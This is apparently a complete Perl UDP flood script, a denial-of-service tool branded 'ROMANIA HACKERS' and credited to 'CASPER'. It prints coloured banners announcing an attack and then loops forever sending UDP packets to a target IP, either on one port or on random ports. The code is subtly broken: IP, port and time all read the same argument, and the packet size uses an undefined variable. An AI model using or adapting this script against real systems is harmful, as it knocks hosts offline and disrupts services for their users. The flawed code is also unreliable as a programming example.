#!/usr/bin/perl
use Socket;
$ARGC=@ARGV;
my ($ip,$port,$size,$time);
$ip=$ARGV[0];
$port=$ARGV[0];
$time=$ARGV[0];
socket(crazy, PF_INET, SOCK_DGRAM, 17);
$iaddr = inet_aton("$ip");

printf "[1;35m#[1;33m#[1;31m*[0;32m  
<-|----------------------------|->
<-| ROMANIA HACKERS WAS HERE ! |->
<-| FACEBOOK - ROMANIA HACKERS |-> 
<-|----------------------------|->
                                                                                    
 [1;36m$ipn";  
printf "[1;35m#[1;33m#[1;31m*[0;32mIP DOWN[0;31m->>[0m\n";
printf "[1;35m#[1;33m#[1;31m*[0;32mATAC PORNIT[0;31m->>> [0m\n";
printf "[1;35m#[1;33m#[1;31m*[0;32mIP-UL A INTRAT IN COMA [1;33C->>>>> [1;36m2018[0m\n";
printf "[1;35m#[1;33m#[1;31m*[0;32mSCRIPT[1;36mBY[0;32m|[1;33m CASPER [0m\n";


if ($ARGV[1] ==0 && $ARGV[2] ==0) {
goto randpackets;
}
if ($ARGV[1] !=0 && $ARGV[2] !=0) {
system("(sleep $time;killall -9 udp) &");
goto packets;
}
if ($ARGV[1] !=0 && $ARGV[2] ==0) {
goto packets;
}
if ($ARGV[1] ==0 && $ARGV[2] !=0) {
system("(sleep $time;killall -9 udp) &"); 
goto randpackets;
}
packets:
for (;;) {
$size=$rand x $rand x $rand;
send(crazy, 0, $size, sockaddr_in($port, $iaddr));
}
randpackets:
for (;;) {
$size=$rand x $rand x $rand;
$port=(rand 65000) +1;
send(crazy, 0, $size, sockaddr_in($port, $iaddr));
}